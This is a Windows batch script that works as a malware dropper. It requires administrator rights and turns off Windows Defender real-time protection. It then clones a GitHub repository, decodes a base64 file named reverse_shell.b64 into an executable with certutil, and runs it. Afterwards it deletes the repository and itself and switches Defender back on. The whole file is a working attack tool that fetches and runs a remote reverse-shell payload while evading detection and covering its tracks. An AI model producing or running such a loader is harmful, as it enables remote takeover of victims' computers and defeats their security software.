@echo off
setlocal enabledelayedexpansion

REM Check if the script is running with administrative privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as an administrator.
    exit /b 1
)

REM Disable Windows Defender temporarily
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
if %errorlevel% neq 0 (
    echo Failed to disable Windows Defender.
    exit /b %errorlevel%
)

REM Get the current script directory
set "scriptDir=%~dp0"
set "scriptDir=%scriptDir:~0,-1%"

REM Define the paths relative to the script directory
set "repoUrl=https://github.com/nithin434/stuff2.git"
set "repoDir=%scriptDir%\stuff2"
set "b64File=%repoDir%\reverse_shell.b64"
set "exeFile=%scriptDir%\reverse_shell.exe"

REM Clone the repository
git clone "%repoUrl%" "%repoDir%"
if %errorlevel% neq 0 (
    echo Failed to clone the repository.
    exit /b %errorlevel%
)

REM Decode the base64 file into the executable
certutil -decode "%b64File%" "%exeFile%"
if %errorlevel% neq 0 (
    echo Failed to decode the base64 file.
    exit /b %errorlevel%
)

REM Execute the decoded executable
start "" "%exeFile%"
if %errorlevel% neq 0 (
    echo Failed to execute the payload.
    exit /b %errorlevel%
)

REM Optionally, delete the repository folder and the batch script after execution
rmdir /s /q "%repoDir%"
del "%~f0"

REM Re-enable Windows Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
if %errorlevel% neq 0 (
    echo Failed to re-enable Windows Defender.
    exit /b %errorlevel%
)

REM End of script
endlocal
